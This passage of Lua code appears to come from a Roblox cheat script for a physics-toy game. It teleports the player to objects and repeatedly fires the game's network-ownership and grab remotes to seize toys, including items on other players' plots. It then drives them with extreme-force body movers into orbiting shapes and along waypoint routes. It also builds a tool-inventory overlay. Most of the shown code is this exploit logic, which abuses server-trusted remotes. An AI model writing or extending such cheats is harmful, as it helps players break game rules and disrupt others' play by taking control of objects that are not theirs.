                    if centerPart and centerPart.Parent then
                        myRoot = centerPart
                    end
                    local radius = KozFlags.tk_Radius
                    local height = KozFlags.tk_Height
                    local speed = KozFlags.tk_Speed
                    angle = angle + math.rad(speed * 20) * dt
                    if angle > math.pi * 2 then angle = angle - math.pi * 2 end
                    local itemList = {}
                    for model, data in pairs(TelekinesisFeature.activeItems) do
                        if model and model.Parent then
                            local grabPart = TelekinesisFeature.getNearbyGrabPart(model)
                            if grabPart then
                                TelekinesisFeature.stopOrbit(model)
                            else
                                if not data.stuckCount then data.stuckCount = 0 end
                                table.insert(itemList, {model = model, drivePart = data.drivePart, bp = data.bp, bg = data.bg, stuckCount = data.stuckCount})
                            end
                        else
                            TelekinesisFeature.activeItems[model] = nil
                        end
                    end
                    local count = #itemList
                    local step = (math.pi * 2) / math.max(count, 1)
                    local centerPos = myRoot.Position + Vector3.new(0, height, 0)
                    for i, item in ipairs(itemList) do
                        local itemAngle = angle + (step * (i - 1))
                        local style = KozFlags.tk_Style
                        local targetPos
                        local customTangent = nil
                        if KozFlags.tk_crazyRadius then
                            local s = i * 1337.1
                            local a1 = now * (15 + i * 4.3) + s
                            local a2 = now * (19 + i * 3.1) + s * 2.3
                            local a3 = now * (23 + i * 5.7) + s * 0.7
                            local mapR = 2400
                            local cx = (math.sin(a1) * 0.6 + math.cos(a2) * 0.4) * mapR
                            local cz = (math.cos(a3) * 0.5 + math.sin(a2) * 0.5) * mapR
                            targetPos = centerPos + Vector3.new(cx, 0, cz)
                        elseif style == "Circle" then
                            targetPos = centerPos + Vector3.new(
                                math.cos(itemAngle) * radius,
                                0,
                                math.sin(itemAngle) * radius
                            )
                        elseif style == "Circle Up Down" then
                            targetPos = centerPos + Vector3.new(
                                math.cos(itemAngle) * radius,
                                math.sin(itemAngle * 2) * height,
                                math.sin(itemAngle) * radius
                            )
                        elseif style == "Square" then
                            local t = (itemAngle % (math.pi * 2)) / (math.pi * 2) * 4
                            local sx, sz
                            if t < 1 then sx, sz = -1 + t * 2, -1
                            elseif t < 2 then sx, sz = 1, -1 + (t - 1) * 2
                            elseif t < 3 then sx, sz = 1 - (t - 2) * 2, 1
                            else sx, sz = -1, 1 - (t - 3) * 2
                            end
                            targetPos = centerPos + Vector3.new(sx * radius, 0, sz * radius)
                        elseif style == "Heart" then
                            local sx = radius / 14
                            local sy = height / 8
                            local ht = itemAngle
                            local hx = 16 * math.sin(ht) ^ 3
                            local hy = 13 * math.cos(ht) - 5 * math.cos(2 * ht) - 2 * math.cos(3 * ht) - math.cos(4 * ht)
                            local heartRight = Vector3.new(1, 0, 0)
                            local heartUp = Vector3.new(0, 1, 0)
                            targetPos = centerPos + heartRight * hx * sx + heartUp * hy * sy
                            local dxdt = 48 * math.sin(ht) ^ 2 * math.cos(ht)
                            local dydt = -13 * math.sin(ht) + 10 * math.sin(2 * ht) + 6 * math.sin(3 * ht) + math.sin(4 * ht)
                            local hmag = math.sqrt(dxdt * dxdt + dydt * dydt)
                            if hmag > 0.001 then
                                customTangent = ((heartRight * dxdt + heartUp * dydt) / hmag)
                            else
                                customTangent = Vector3.new(1, 0, 0)
                            end
                        elseif style == "Tornado" then
                            local itemCount = math.max(count, 1)
                            local itemFrac = (i - 1) / itemCount
                            local tornadoR = radius * (0.3 + itemFrac * 0.7)
                            local tornadoY = itemFrac * height * 2 - height
                            local baseSpin = angle + itemFrac * math.pi * 4
                            local seed = i * 1337.1
                            local randAngle = math.noise(seed, 0, 0) * math.pi * 2
                            local randR = (math.noise(0, seed, 0) * 0.5 + 0.5) * tornadoR * 0.4
                            local tornadoSpin = baseSpin + randAngle
                            local finalR = tornadoR + randR
                            targetPos = centerPos + Vector3.new(
                                math.cos(tornadoSpin) * finalR,
                                tornadoY + math.noise(seed, seed, 0) * height * 0.15,
                                math.sin(tornadoSpin) * finalR
                            )
                            local tangX = -math.sin(tornadoSpin) * finalR * speed
                            local tangZ = math.cos(tornadoSpin) * finalR * speed
                            local tangY = height * 2 * 0.15 * speed / (math.pi * 2)
                            local tmag = math.sqrt(tangX * tangX + tangY * tangY + tangZ * tangZ)
                            if tmag > 0.001 then
                                customTangent = Vector3.new(tangX, tangY, tangZ) / tmag
                            end
                        elseif style == "Galactic" then
                            local arms = 4
                            local armIdx = (i - 1) % arms
                            local armPhase = armIdx * (math.pi * 2 / arms)
                            local objectsPerArm = math.max(1, math.floor(count / arms))
                            local posInArm = math.floor((i - 1) / arms)
                            local armFrac = objectsPerArm > 1 and (posInArm / (objectsPerArm - 1)) or 0.5
                            local galR = radius * (0.08 + armFrac * 0.92)
                            local spiralTight = 2.5
                            local galAngle = armPhase + armFrac * spiralTight + itemAngle * 0.3
                            local galY = math.sin(armFrac * math.pi * 2 + itemAngle * 0.2) * height * 0.25
                            targetPos = centerPos + Vector3.new(
                                math.cos(galAngle) * galR,
                                galY,
                                math.sin(galAngle) * galR
                            )
                        elseif style == "Wave" then
                            local waveX = ((i - 1) / math.max(1, count - 1) - 0.5) * radius * 2
                            local waveY = math.sin(waveX / radius * math.pi * 2 + itemAngle * 2) * height
                            local waveZ = math.cos(waveX / radius * math.pi * 2 + itemAngle * 2) * height * 0.5
                            targetPos = centerPos + Vector3.new(waveX, waveY, waveZ)
                        elseif style == "Infinity" then
                            local ix = radius * math.sin(itemAngle)
                            local iz = radius * math.sin(itemAngle) * math.cos(itemAngle)
                            targetPos = centerPos + Vector3.new(ix, 0, iz)
                        elseif style == "Christmas Tree" then
                            local normPos = (i - 1) / math.max(count, 1)
                            local treeH = KozFlags.tk_TreeHeight
                            local layerRadius = radius * (1 - normPos)
                            local layerHeight = treeH * normPos
                            local layerAngle = math.rad((angle * 360 + i * 30) % 360)
                            targetPos = centerPos + Vector3.new(
                                math.cos(layerAngle) * layerRadius,
                                layerHeight,
                                math.sin(layerAngle) * layerRadius
                            )
                        elseif style == "Wings" then
                            local half = math.ceil(count / 2)
                            local isLeft = i <= half
                            local side = isLeft and -1 or 1
                            local wingIdx = isLeft and (half - i + 1) or (i - half)
                            local lookVec = myRoot.CFrame.LookVector
                            local rightVec = myRoot.CFrame.RightVector
                            local backVec = -lookVec
                            local normPos = wingIdx / math.max(half, 1)
                            local minDist = 3
                            local spread = math.max(minDist, radius * normPos + minDist)
                            local yOffset = height * normPos * 0.5
                            local backOffset = radius * 0.1 * (1 - normPos * 0.3)
                            local flapY = math.sin(tick() * speed) * height * normPos
                            targetPos = myRoot.Position
                                + rightVec * side * spread
                                + backVec * backOffset
                                + Vector3.new(0, yOffset + flapY, 0)
                        elseif style == "Spiral" then
                            local spiralAngle = angle + step * (i - 1)
                            local baseY = math.sin(now * 40 + i * 2.3) * height * 3
                            local sharpY = math.sin(now * 90 + i * 5.7) * height * 1.5
                            local jitterY = baseY + sharpY
                            targetPos = centerPos + Vector3.new(
                                math.cos(spiralAngle) * radius,
                                jitterY,
                                math.sin(spiralAngle) * radius
                            )
                        else
                            targetPos = centerPos + Vector3.new(
                                math.cos(itemAngle) * radius,
                                0,
                                math.sin(itemAngle) * radius
                            )
                        end
                            if not item.drivePart or not item.drivePart.Parent then
                                item.drivePart = item.model:FindFirstChild("SoundPart")
                                    or item.model:FindFirstChildWhichIsA("BasePart")
                            end
                            local drivePart = item.drivePart
                            if drivePart and drivePart.Parent then
                            local nearbyGrabPart = TelekinesisFeature.getNearbyGrabPart(item.model)
                            if nearbyGrabPart then
                                if not item.regrabRunning then                                item.regrabRunning = true
                                    task.spawn(function()
                                        local dp = drivePart
                                        local mdl = item.model
                                        if not dp or not dp.Parent then item.regrabRunning = false return end
                                        local savedMyCF = myRoot.CFrame
                                        myRoot.CFrame = dp.CFrame
                                        task.wait(0.05)
                                        for _, part in ipairs(mdl:GetDescendants()) do
                                            if part:IsA("BasePart") then
                                                for i = 1, 5 do
                                                    KozDisp:Fire(SetNetworkOwner, part, myRoot.CFrame)
                                                    task.wait(0.02)
                                                end
                                            end
                                        end
                                        KozDisp:Fire(CreateGrabLine, dp, Vector3.zero, dp.Position, false)
                                        task.wait(0.02)
                                        KozDisp:Fire(DestroyGrabLine, dp)
                                        task.wait(0.05)
                                        for _, part in ipairs(mdl:GetDescendants()) do
                                            if part:IsA("BasePart") then
                                                part.CanCollide = false
                                                part.Anchored = false
                                            end
                                        end
                                        local bp = dp:FindFirstChildOfClass("BodyPosition")
                                        if not bp then
                                            bp = Instance.new("BodyPosition")
                bp.MaxForce = Vector3.new(5e18, 5e18, 5e18)
                                            bp.D = 1000
                                            bp.P = 50000
                                            bp.Parent = dp
                                        end
                                        item.bp = bp
                                        local bg = dp:FindFirstChildOfClass("BodyGyro")
                                        if not bg then
                                            bg = Instance.new("BodyGyro")
                                            bg.MaxTorque = Vector3.new(5e18, 5e18, 5e18)
                                            bg.D = 1000
                                            bg.P = 50000
                                            bg.Parent = dp
                                        end
                                        item.bg = bg
                                        myRoot.CFrame = savedMyCF
                                        item.regrabRunning = false
                                    end)
                                end
                            else
                                for _, part in ipairs(item.model:GetDescendants()) do
                                    if part:IsA("BasePart") then
                                        part.CanCollide = false
                                    end
                                end
                                if drivePart.Anchored then drivePart.Anchored = false end
                                local bp = drivePart:FindFirstChildOfClass("BodyPosition")
                                if not bp then
                                    bp = Instance.new("BodyPosition")
                                    bp.MaxForce = Vector3.new(5e18, 5e18, 5e18)
                                    bp.D = 1000
                                    bp.P = 50000
                                    bp.Parent = drivePart
                                end
                                item.bp = bp
                                local bg = drivePart:FindFirstChildOfClass("BodyGyro")
                                if not bg then
                                    bg = Instance.new("BodyGyro")
                                    bg.MaxTorque = Vector3.new(5e18, 5e18, 5e18)
                                    bg.D = 1000
                                    bg.P = 50000
                                    bg.Parent = drivePart
                                end
                                item.bg = bg
                                pcall(function()
                                    bp.Position = targetPos
                                    if KozFlags.tk_lookAtMe then
                                        local dirXZ = (myRoot.Position - drivePart.Position) * Vector3.new(1, 0, 1)
                                        if dirXZ.Magnitude > 0.01 then
                                            bg.CFrame = CFrame.new(drivePart.Position, drivePart.Position + dirXZ.Unit)
                                        end
                                    else
                                        local targetRot = CFrame.Angles(
                                            math.rad(KozFlags.tk_RotX),
                                            math.rad(KozFlags.tk_RotY),
                                            math.rad(KozFlags.tk_RotZ)
                                        )
                                        bg.CFrame = CFrame.new(drivePart.Position) * targetRot
                                    end
                                end)
                            end
                        end
                    end
                end
            end)
        end
        function TelekinesisFeature.startSpawnedWatcher()
            if TelekinesisFeature.spawnConn then return end
            local SpawnedInToys = Workspace:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
            if not SpawnedInToys then return end
            TelekinesisFeature.spawnConn = SpawnedInToys.ChildAdded:Connect(function(child)
                if not KozFlags.tk_Enabled then return end
                if not KozFlags.tk_TargetSpawned then return end
                local myChar = KozPLR.Character
                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if not myRoot then return end
                local dp = TelekinesisFeature.getDrivePart(child)
                if not dp then return end
                local savedCF = myRoot.CFrame
                myRoot.CFrame = dp.CFrame
                task.wait(0.1)
                KozDisp:Fire(SetNetworkOwner, dp, myRoot.CFrame)
                KozDisp:Fire(CreateGrabLine, dp, Vector3.zero, dp.Position, false)
                KozDisp:Fire(DestroyGrabLine, dp)
                task.wait(0.05)
                TelekinesisFeature.startOrbit(child, true)
                task.wait(0.05)
                myRoot.CFrame = savedCF
            end)
        end
        function TelekinesisFeature.stopSpawnedWatcher()
            if TelekinesisFeature.spawnConn then TelekinesisFeature.spawnConn:Disconnect() TelekinesisFeature.spawnConn = nil end
        end
        function TelekinesisFeature.scanPlotItems()
            local plotItems = Workspace:FindFirstChild("PlotItems")
            if not plotItems then return end
            for i = 1, 5 do
                local plotFolder = plotItems:FindFirstChild("Plot" .. i)
                if plotFolder then
                    for _, model in ipairs(plotFolder:GetDescendants()) do
                        if model:IsA("Model") and not TelekinesisFeature.activeItems[model] then
                            local dp = TelekinesisFeature.getDrivePart(model)
                            if dp then
                                TelekinesisFeature.startOrbit(model, true)
                            end
                        end
                    end
                end
            end
        end
        function TelekinesisFeature.scanSpawnedToys()
            local SpawnedInToys = Workspace:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
            if not SpawnedInToys then return end
            local myChar = KozPLR.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myRoot then return end
            for _, child in ipairs(SpawnedInToys:GetChildren()) do
                if not TelekinesisFeature.activeItems[child] then
                    local dp = TelekinesisFeature.getDrivePart(child)
                    if dp then
                        local savedCF = myRoot.CFrame
                        myRoot.CFrame = dp.CFrame
                        task.wait(0.1)
                        KozDisp:Fire(SetNetworkOwner, dp, myRoot.CFrame)
                        KozDisp:Fire(CreateGrabLine, dp, Vector3.zero, dp.Position, false)
                        KozDisp:Fire(SetNetworkOwner, dp, myRoot.CFrame)
                        KozDisp:Fire(DestroyGrabLine, dp)
                        task.wait(0.1)
                        myRoot.CFrame = savedCF
                        TelekinesisFeature.startOrbit(child, true)
                    end
                end
            end
        end
        TelekinesisFeature.palletExploreConn = nil
        function TelekinesisFeature.startPalletExplore()
            if TelekinesisFeature.palletExploreConn then return end
            local function getGrabbedPart()
                local grabParts = Workspace:FindFirstChild("GrabParts")
                if not grabParts then return nil end
                for _, gp in ipairs(grabParts:GetChildren()) do
                    if gp.Name == "GrabPart" then
                        local weld = gp:FindFirstChildOfClass("WeldConstraint")
                            or gp:FindFirstChildOfClass("Weld")
                            or gp:FindFirstChildOfClass("ManualWeld")
                        if weld then
                            local p0 = weld.Part0
                            local p1 = weld.Part1
                            if p1 and p1 ~= gp then return p1 end
                            if p0 and p0 ~= gp then return p0 end
                        end
                    end
                end
                return nil
            end
            local dp = getGrabbedPart()
            if not dp then return end
            local targetModel = dp.Parent
            if not targetModel then return end
            local highlight = Instance.new("Highlight")
            highlight.FillColor = Color3.fromRGB(0, 170, 255)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.FillTransparency = 0.5
            highlight.OutlineTransparency = 0
            highlight.Parent = targetModel
            local rad = math.rad
            local function makeRot(rx, ry, rz)
                return CFrame.Angles(rad(rx), rad(ry), rad(rz))
            end
            local waypoints = {
                {pos = Vector3.new(-316.27703857421875, 56.2031364440918, -179.00755310058594), rot = makeRot(0.017999999225139618, 27.718000411987305, 0.019999999552965164), waitTime = 5},
                {pos = Vector3.new(-401.4556884765625, 28.313364028930664, -130.06117248535156), rot = makeRot(-179.7570037841797, -71.60399627685547, 179.79600524902344), waitTime = 3},
                {pos = Vector3.new(-452.55908203125, 24.746112823486328, 42.982810974121094), rot = makeRot(-0.2460000067949295, -70.1259994506836, -0.46000000834465027), waitTime = 3},
                {pos = Vector3.new(-299.23150634765625, 95.85819244384766, 217.03387451171875), rot = makeRot(0.003000000026077032, 13.48900032043457, 0.017999999225139618), waitTime = 5},
                {pos = Vector3.new(-213.0196990966797, 80.20887756347656, 396.256591796875), rot = makeRot(0.04600000008940697, -0.17499999701976776, 0.0020000000949949026), waitTime = 7},
                {pos = Vector3.new(-59.78620910644531, 156.22940063476562, 368.65545654296875), rot = makeRot(-179.89199829101562, 6.166999816894531, -179.98699951171875), waitTime = 3},
                {pos = Vector3.new(185.5255889892578, 16.997987747192383, 396.1617736816406), rot = makeRot(0.21199999749660492, 55.944000244140625, -0.12300000339746475), waitTime = 3},
                {pos = Vector3.new(223.5327911376953, 179.19735717773438, 174.54293823242188), rot = makeRot(-0.10100000351667404, 78.58100128173828, 0.17399999499320984), waitTime = 5},
                {pos = Vector3.new(-97.45641326904297, 86.93302154541016, -178.3148956298828), rot = makeRot(177.04600524902344, -32.340999603271484, 176.04100036621094), waitTime = 3},
                {pos = Vector3.new(-196.11106872558594, 82.6692123413086, -285.0792236328125), rot = makeRot(-179.74899291992188, -45.652000427246094, -179.89500427246094), waitTime = 3},
                {pos = Vector3.new(-102.37547302246094, 85.39105987548828, -210.48292541503906), rot = makeRot(-11.321999549865723, 89.36499786376953, 11.734999656677246), waitTime = 4},
                {pos = Vector3.new(451.05316162109375, 103.48825073242188, -260.166259765625), rot = makeRot(-179.8719940185547, 39.3489990234375, -179.68800354003906), waitTime = 3},
                {pos = Vector3.new(440.869140625, 153.43955993652344, -86.38394165039062), rot = makeRot(-179.30499267578125, 85.6520004272461, 179.7209930419922), waitTime = 3},
                {pos = Vector3.new(196.41908264160156, 32.962947845458984, 150.6081085205078), rot = makeRot(-0.0020000000949949026, -46.44499969482422, 0.00800000037997961), waitTime = 4},
                {pos = Vector3.new(-191.9010772705078, 26.14925765991211, -5.109410762786865), rot = makeRot(-168.9219970703125, 89.90899658203125, 168.8679962158203), waitTime = 6},
                {pos = Vector3.new(-503.68096923828125, 253.42152404785156, 382.37152099609375), rot = makeRot(179.99099731445312, -21.702999114990234, -179.93899536132812), waitTime = 4},
            }
            TelekinesisFeature.palletExploreConn = task.spawn(function()
                local maxSpeed = 80
                local arriveRadius = 1.5
                local accelDist = 5
                local decelDist = 10
                local holdSpringK = 20
                local waypointIdx = 1
                local segTotalDist = (waypoints[1].pos - dp.Position).Magnitude
                local segStartRot = dp.CFrame - dp.Position
                while KozFlags.tk_palletExplore do
                    if not dp or not dp.Parent then break end
                    local wp = waypoints[waypointIdx]
                    if not wp then
                        waypointIdx = 1
                        wp = waypoints[waypointIdx]
                        segTotalDist = (wp.pos - dp.Position).Magnitude
                        segStartRot = dp.CFrame - dp.Position
                    end
                    local diff = wp.pos - dp.Position
                    local dist = diff.Magnitude
                    if dist < arriveRadius then
                        if wp.waitTime <= 0 then
                            waypointIdx = waypointIdx + 1
                            segStartRot = dp.CFrame - dp.Position
                            if waypointIdx <= #waypoints then
                                segTotalDist = (waypoints[waypointIdx].pos - dp.Position).Magnitude
                            end
                            continue
                        end
                        local elapsed = 0
                        local holdRotStart = dp.CFrame - dp.Position
                        local holdRotTime = 0.3
                        local prevVel = dp.AssemblyLinearVelocity
                        while elapsed < wp.waitTime do
                            if not KozFlags.tk_palletExplore then break end
                            if not dp or not dp.Parent then break end
                            local posErr = wp.pos - dp.Position
                            local springVel = posErr * holdSpringK
                            local blendIn = math.clamp(elapsed / 0.3, 0, 1)
                            dp.AssemblyLinearVelocity = prevVel:Lerp(springVel, blendIn)
                            prevVel = dp.AssemblyLinearVelocity
                            local rotBlend = math.clamp(elapsed / holdRotTime, 0, 1)
                            local smoothBlend = rotBlend * rotBlend * (3 - 2 * rotBlend)
                            dp.CFrame = CFrame.new(dp.Position) * holdRotStart:Lerp(wp.rot, smoothBlend)
                            dp.AssemblyAngularVelocity = Vector3.zero
                            dp.RotVelocity = Vector3.zero
                            local dt = RunService.Heartbeat:Wait()
                            elapsed = elapsed + dt
                        end
                        waypointIdx = waypointIdx + 1
                        segStartRot = wp.rot
                        if waypointIdx <= #waypoints then
                            segTotalDist = (waypoints[waypointIdx].pos - dp.Position).Magnitude
                        end
                    else
                        local traveledDist = math.clamp(segTotalDist - dist, 0, segTotalDist)
                        local accelPhase = math.clamp(traveledDist / accelDist, 0, 1)
                        local decelPhase = math.clamp(dist / decelDist, 0, 1)
                        local speedMult = math.min(accelPhase, decelPhase)
                        speedMult = math.clamp(speedMult, 0.05, 1)
                        speedMult = speedMult * speedMult * (3 - 2 * speedMult)
                        local progress = math.clamp(traveledDist / math.max(segTotalDist, 1), 0, 1)
                        local smoothProgress = progress * progress * (3 - 2 * progress)
                        local interpRot = segStartRot:Lerp(wp.rot, smoothProgress)
                        dp.AssemblyLinearVelocity = diff.Unit * maxSpeed * speedMult
                        dp.CFrame = CFrame.new(dp.Position) * interpRot
                        dp.AssemblyAngularVelocity = Vector3.zero
                        dp.RotVelocity = Vector3.zero
                        RunService.Heartbeat:Wait()
                    end
                end
                if dp and dp.Parent then
                    dp.AssemblyLinearVelocity = Vector3.zero
                    dp.AssemblyAngularVelocity = Vector3.zero
                    dp.RotVelocity = Vector3.zero
                end
                if highlight and highlight.Parent then highlight:Destroy() end
                TelekinesisFeature.palletExploreConn = nil
            end)
        end
        function TelekinesisFeature.stopPalletExplore()
            KozFlags.tk_palletExplore = false
            TelekinesisFeature.palletExploreConn = nil
        end
        KozFlags._feature = TelekinesisFeature
    -- ---- sco: oyundaki arac listesi katmani (Spisok) ----
        local sco = {}
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ToolInventory"
        screenGui.Parent = Services.PlayerGui
        screenGui.ResetOnSpawn = false
        local mainFrame = Instance.new("Frame")
        mainFrame.Name = "MainFrame"
        mainFrame.Size = UDim2.new(0, 0, 0, 44)
        mainFrame.Position = UDim2.new(0.5, 0, 1, -30)
        mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
        mainFrame.BackgroundTransparency = 0.7
        mainFrame.BorderSizePixel = 0
        mainFrame.ClipsDescendants = true
        mainFrame.Visible = false
        mainFrame.Parent = screenGui
        Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
        local toolList = Instance.new("Frame")
        toolList.Name = "ToolList"
        toolList.Size = UDim2.new(1, -12, 1, -12)
        toolList.Position = UDim2.new(0, 6, 0, 6)
        toolList.BackgroundTransparency = 1
        toolList.Parent = mainFrame
        local gridLayout = Instance.new("UIGridLayout")
        gridLayout.Parent = toolList
        gridLayout.CellSize = UDim2.new(0, 28, 0, 28)
        gridLayout.CellPadding = UDim2.new(0, 8, 0, 8)
        gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        gridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        gridLayout.FillDirectionMaxCells = 10
        sco.slots = {}
        sco.MAX = 10
        sco.toolList = toolList
        sco.mainFrame = mainFrame
        sco.gridLayout = gridLayout
        function sco.isEquipped(toolName)
            local c = KozPLR.Character
            if c then
                local e = c:FindFirstChild(toolName)
                if e and e:IsA("Tool") then return true end
            end
            return false
        end
        function sco.updateHighlight()
            for _, btn in pairs(toolList:GetChildren()) do
                if btn:IsA("ImageButton") then
                    if sco.isEquipped(btn.Name) then
                        btn.BackgroundColor3 = Color3.new(0.6, 0.6, 0.6)
                        btn.BackgroundTransparency = 0.2
                        btn.BorderSizePixel = 2
                        btn.BorderColor3 = Color3.new(1, 1, 1)
                    else
                        btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
                        btn.BackgroundTransparency = 0.5
                        btn.BorderSizePixel = 2
                        btn.BorderColor3 = Color3.new(0.2, 0.2, 0.2)
                    end
                end
            end
        end
        function sco.toggleSlot(n)
            if n < 1 or n > sco.MAX then return end
            local tool = sco.slots[n]
            if not tool then return end
            local c = KozPLR.Character
            local bp = KozPLR.Backpack
            if not c or not bp then return end
            if c:FindFirstChild(tool.Name) then
                tool.Parent = bp
            else
                local t = bp:FindFirstChild(tool.Name)
                if t then t.Parent = c end
            end
            sco.updateHighlight()
        end
        function sco.updateFrameSize(toolCount)
            if toolCount == 0 or not KozFlags.toyList then
                mainFrame.Visible = false
                return
            end
            mainFrame.Visible = true
            local s, p, m = 28, 8, 12
            local dc = math.min(toolCount, sco.MAX)
            local mw = 400
            local ipr = math.max(1, math.floor((mw - m) / (s + p)))
            local rows = math.ceil(dc / ipr)
            local tw
            if rows == 1 then
                tw = (dc * s) + ((dc - 1) * p) + m
            else
                tw = math.min((ipr * s) + ((ipr - 1) * p) + m, mw)
            end
            local th = (rows * s) + ((rows - 1) * p) + m
            gridLayout.CellSize = UDim2.new(0, s, 0, s)
            gridLayout.CellPadding = UDim2.new(0, p, 0, p)
            TweenService:Create(mainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, tw, 0, th),
                Position = UDim2.new(0.5, -tw/2, 1, -(th + 6))
            }):Play()
        end
        function sco.createButton(tool, slotNumber)
            local button = Instance.new("ImageButton")
            button.Name = tool.Name
            button.Size = UDim2.new(0, 28, 0, 28)
            button.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
            button.BackgroundTransparency = 0.5
            button.BorderSizePixel = 2
            button.BorderColor3 = Color3.new(0.2, 0.2, 0.2)
            button.AutoButtonColor = false
            Instance.new("UICorner", button).CornerRadius = UDim.new(0, 4)
            local icon = Instance.new("ImageLabel")
            icon.Name = "Icon"
            icon.Size = UDim2.new(0, 20, 0, 20)
            icon.Position = UDim2.new(0.5, -10, 0.25, 0)
            icon.BackgroundTransparency = 1
            if tool:FindFirstChild("Handle") then
                local h = tool.Handle
                icon.Image = (h:IsA("BasePart") and h:FindFirstChild("Texture") and h.Texture) or "rbxassetid://13115827754"
            else
                icon.Image = "rbxassetid://13115827754"
            end
            icon.Parent = button
            local sl = Instance.new("TextLabel")
            sl.Name = "SlotLabel"
            sl.Size = UDim2.new(0, 10, 0, 10)
            sl.Position = UDim2.new(0, 2, 0, 2)
            sl.BackgroundTransparency = 1
            sl.Text = tostring(slotNumber)
            sl.TextColor3 = Color3.new(1, 1, 1)
            sl.TextScaled = true
            sl.Font = Enum.Font.GothamBold
            sl.TextXAlignment = Enum.TextXAlignment.Left
            sl.TextYAlignment = Enum.TextYAlignment.Top
            sl.Parent = button
            local lb = Instance.new("TextLabel")
            lb.Name = "Label"
            lb.Size = UDim2.new(1, 0, 0, 10)
            lb.Position = UDim2.new(0, 0, 0.65, 0)
            lb.BackgroundTransparency = 1
            lb.Text = tool.Name
            lb.TextColor3 = Color3.new(1, 1, 1)
            lb.TextScaled = true
            lb.Font = Enum.Font.GothamBold
            lb.Parent = button
            button.MouseEnter:Connect(function()
                local ti = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                TweenService:Create(button, ti, {Size = UDim2.new(0, 32, 0, 32), BackgroundTransparency = sco.isEquipped(button.Name) and 0.1 or 0.2}):Play()
            end)
            button.MouseLeave:Connect(function()
                local ti = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                TweenService:Create(button, ti, {Size = UDim2.new(0, 28, 0, 28), BackgroundTransparency = sco.isEquipped(button.Name) and 0.2 or 0.5}):Play()
            end)
            button.MouseButton1Down:Connect(function()
                TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 24, 0, 24), BackgroundTransparency = 0.3}):Play()
            end)
            button.MouseButton1Up:Connect(function()
                TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 28, 0, 28), BackgroundTransparency = 0.2}):Play()
            end)
            button.MouseButton1Click:Connect(function()
                sco.toggleSlot(slotNumber)
            end)
            return button
        end
        function sco.refresh()
            for _, ch in pairs(toolList:GetChildren()) do
                if ch:IsA("ImageButton") then ch:Destroy() end
            end
            sco.slots = {}
            local tools = {}
            local ch = KozPLR.Character
            local bp = KozPLR.Backpack
            if bp then
                for _, t in pairs(bp:GetChildren()) do
                    if t:IsA("Tool") then table.insert(tools, t) end
                end
            end
            if ch then
                for _, t in pairs(ch:GetChildren()) do
                    if t:IsA("Tool") then
                        local ok = false
                        for _, x in pairs(tools) do if x.Name == t.Name then ok = true break end end
                        if not ok then table.insert(tools, t) end
                    end
                end
            end
            local n = 1
            for _, t in pairs(tools) do
                if n <= sco.MAX then
                    sco.slots[n] = t
                    local b = sco.createButton(t, n)
                    b.Parent = toolList
                    n = n + 1
                end
            end
            sco.updateFrameSize(#sco.slots)
            sco.updateHighlight()
        end
        function sco.setupChar(c)
            if c then
                c.ChildAdded:Connect(sco.refresh)
                c.ChildRemoved:Connect(sco.refresh)
                sco.refresh()
            end
        end
        UserInputService.InputBegan:Connect(function(input, gp)
            if gp then return end
            local g = Services.PlayerGui:FindFirstChild("ToolInventory")
            if not g then return end
            local mf = g:FindFirstChild("MainFrame")
            if not mf or not mf.Visible then return end
            local km = {
                [Enum.KeyCode.One] = 1, [Enum.KeyCode.Two] = 2, [Enum.KeyCode.Three] = 3,
                [Enum.KeyCode.Four] = 4, [Enum.KeyCode.Five] = 5, [Enum.KeyCode.Six] = 6,
                [Enum.KeyCode.Seven] = 7, [Enum.KeyCode.Eight] = 8, [Enum.KeyCode.Nine] = 9,
                [Enum.KeyCode.Zero] = 10
            }
            local sn = km[input.KeyCode]
            if sn then sco.toggleSlot(sn) end
        end)
        KozPLR.CharacterAdded:Connect(sco.setupChar)
        KozPLR.Backpack.ChildAdded:Connect(sco.refresh)
        KozPLR.Backpack.ChildRemoved:Connect(sco.refresh)
        if KozPLR.Character then sco.setupChar(KozPLR.Character)
        else KozPLR.CharacterAdded:Connect(sco.setupChar) end
        sco.refresh()
        KozFlags.refreshToolList = sco.refresh
        RunService.Heartbeat:Connect(function() sco.updateHighlight() end)
end
do
    -- musa'daki Utility.GetPlayerCFrame karsiligi (kozmoz'un KozUtil.getRoot'u ile)
    function KozUtil.GetPlayerCFrame()
        local root = KozUtil.getRoot(Services.LocalPlayer.Character)
        return root and root.CFrame
    end
    local function applyScreenStretch(cf)
        if not KozFlags.screenStretchEnabled then return cf end
        local t = KozFlags.screenStretchIntensity / 500
        if t <= 0 then return cf end
        local right = cf.RightVector
        local up = cf.UpVector
        local r = right.Magnitude
        local u = up.Magnitude
        if r > 0.001 then right = right / r end
        if u > 0.001 then up = up / u end
        return CFrame.fromMatrix(cf.Position, right * (1 + t * 0.2), up * (1 - t * 0.35), -cf.LookVector)
    end
    local function setCamCFrame(cf)
        local cam = KozWS.CurrentCamera
        if cam then cam.CFrame = applyScreenStretch(cf) end
    end

    local FTAP = {}
    function FTAP.SetNetworkOwner(part, cf)
        if not part or not part.Parent then return end
        KozDisp:Fire(KozRemote.SetNetworkOwner, part, cf or KozUtil.GetPlayerCFrame())
    end
    function FTAP.DestroyGrabLine(part)
        if not part then return end
        KozDisp:Fire(KozRemote.DestroyGrabLine, part)
    end

    local KozMiscFeature = {}
    function KozMiscFeature.enableThirdPerson()
